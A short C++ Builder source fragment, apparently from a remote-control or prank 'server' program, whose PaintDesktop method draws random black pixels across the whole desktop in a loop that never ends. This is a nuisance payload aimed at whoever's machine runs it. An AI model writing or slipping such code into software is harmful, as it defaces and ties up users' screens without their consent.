/***********************************************************************
*   
*
************************************************************************/


void __fastcall TfrmMainServer::PaintDesktop(bool bFlag) {
    if (bFlag == true) {
        TCanvas *dt = new TCanvas ;
        randomize();
        dt->Handle = GetDC(0);
        while (dt) {
            Application->ProcessMessages();
            dt->Pixels[random(Screen->Width)][random(Screen->Height)] = (TColor)0;
        }
    } else {
        //ShowWindow(hClockWnd, SW_SHOW);
    } 
}
